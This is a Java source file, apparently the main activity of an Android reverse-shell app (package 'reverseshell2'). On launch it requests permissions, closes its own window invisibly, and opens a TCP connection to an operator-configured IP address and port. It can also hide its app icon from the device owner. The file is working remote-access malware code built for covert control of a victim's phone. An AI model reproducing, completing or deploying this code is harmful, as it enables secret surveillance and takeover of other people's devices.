package com.example.reverseshell2;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;


public class MainActivity extends AppCompatActivity {

    Activity activity = this;
    Context context;
    static String TAG = "MainActivityClass";
    private PowerManager.WakeLock mWakeLock = null;
    private boolean permissionsRequested = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        overridePendingTransition(0, 0);
        context = getApplicationContext();
        Log.d(TAG, config.IP + "\t" + config.port);
        
        // Request runtime permissions for Android 6.0+
        if (!PermissionHandler.areAllPermissionsGranted(context)) {
            PermissionHandler.checkAndRequestPermissions(this);
            permissionsRequested = true;
        } else {
            startApp();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                          @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PermissionHandler.PERMISSION_REQUEST_CODE) {
            // Log which permissions were granted/denied
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    Log.d(TAG, "Permission granted: " + permissions[i]);
                } else {
                    Log.w(TAG, "Permission denied: " + permissions[i]);
                }
            }
            
            // Start app even if some permissions are denied (they'll fail at runtime)
            startApp();
        }
    }
    
    private void startApp() {
        if (permissionsRequested) {
            // Avoid duplicate execution
            permissionsRequested = false;
        }
        
//        new functions(activity).overlayChecker(context);
//        final PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
//        mWakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK,TAG);
//        mWakeLock.acquire();
        finish();
        new tcpConnection(activity, context).execute(config.IP, config.port);
        overridePendingTransition(0, 0);
        if (config.icon) {
            new functions(activity).hideAppIcon(context);
        }
    }
}
